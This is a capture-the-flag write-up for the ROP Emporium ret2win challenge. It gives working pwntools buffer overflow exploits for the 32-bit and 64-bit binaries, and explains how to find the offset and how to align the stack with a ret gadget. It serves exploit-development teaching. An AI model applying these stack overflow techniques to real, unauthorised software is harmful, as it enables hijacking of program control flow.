# ret2win
`64bit binary` `32bit binary` `ret2win`
<br>
<br>

## 32bit Binary (x86_64)
Let's start by listing the function in the binary using gef with the command `info fun`.

<p align=center>
    <img src="https://github.com/Kiinzu/writeups/assets/115586420/bba87cce-30fe-4159-87a9-f7e8232a85dd" width=50%>
</p>

Next step is finding the offset first using gdb with gef, we can just simply do `pattern create` then run the binary and paste the pattern created by gef as the input. It will return to us a `segmentation fault` which mean we successfully overflow the binary, now we are going to search for the `eip` offset by doing `pattern offset $eip`

<p align=center>
    <img src="https://github.com/Kiinzu/writeups/assets/115586420/1af1783e-870f-4e63-98ab-98c34fccc2e3" width=80%>
</p>
Once we know the offset, which is 44, we are going to make the final script to jump to the win. the final script would look like this.

```python
from pwn import *

binary = './ret2win32'
elf = context.binary = ELF(binary)

p = process(binary)

p.recv()

payload = b'a'*44
payload+= p32(elf.sym['ret2win'])

p.sendline(payload)
p.interactive()
```

And we got the flag

```tmux
[*] '/ROPemporium/ret2win/32bit/ret2win32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './ret2win32': pid 2559
[*] Switching to interactive mode
> Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
$ 
```


## 64bit Binary (x86_64)
We are not going to repeat the first step like in the 32bit writeup, because the functions are the exact same, it just has different arch. We are going to jump to step 2, finding the offset using gdb-gef. The only difference here is, we are not going to work with the `eip` since it's 32 bit register, but we are going to work with `rip` and `rsp`. In 64 bit if we did an overflow, we want to look for the `rsp` since its top also point right before the `rip`, to put it more simple, if we manage to overflow it to `old RBP` we can rewrtie the `RIP (Instruction Pointer)`, it looks like this.
```
=========================
|          RIP          |
=========================  <- Offset, that allow us to write on the RIP
|       OLD RBP         |  
=========================
|                       |
|          RSP          |
|                       |
=========================

```
Back to finding the offset, we can use the same command but the pattern we want to search is `pattern search $rsp`. It looks like we found it at 40.

<p align=center>
    <img src="https://github.com/Kiinzu/writeups/assets/115586420/4705e1e2-bc5b-45b2-8d32-88be2532a63b" width=80%>
</p>

Before making the full payload, we need to find a `return gadget (ret)`, why? In 64 bit binary, before a `call` instruction is executed the stack need to be 16-byte aligned, else it will cause an error because the stack is not aligned. This can be avoided with 2 methods, first we can add an extra `ret` before the `call / jump`. Second we can skip the `push rbp` and jump to `mov rbp,rsp` instruction in that function, for the second method, we can use this `elf.sym['ret2win]+1` to tell the address we used is the +1 after `push rbp`. Worry not, in this write-up I provide you both the solution.

#### Solution 1 : using ret gadget
To get the `ret` gadget, we can use `ROPgadget` with the command 

```bash
ROPgadget --binary ret2win > output.txt
```

after that you can search in the `ret` gadget in the output.txt, the gadget will be this one `0x000000000040053e : ret`

```python
from pwn import *

binary = './ret2win'
elf = context.binary = ELF(binary)

p = process(binary)

payload = b'a'*40
payload+= p64(0x000000000040053e) #ret
payload+= p64(elf.sym['ret2win'])

p.sendline(payload)
p.interactive()
```

#### Solution 2 : using the [push rbp]+1 (mov rbp,rsp)
In the second solution, you just need to remove the `ret` gadget from the `solution 1` and put a `+1` after geting the `ret2win function address` 

```python
from pwn import *

binary = './ret2win'
elf = context.binary = ELF(binary)

p = process(binary)

payload = b'a'*40
payload+= p64(elf.sym['ret2win']+1)

p.sendline(payload)
p.interactive()
```

Either way we will get the flag
```bash
[*] '/ROPemporium/ret2win/64bit/ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './ret2win': pid 5686
[*] Switching to interactive mode
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
$
```
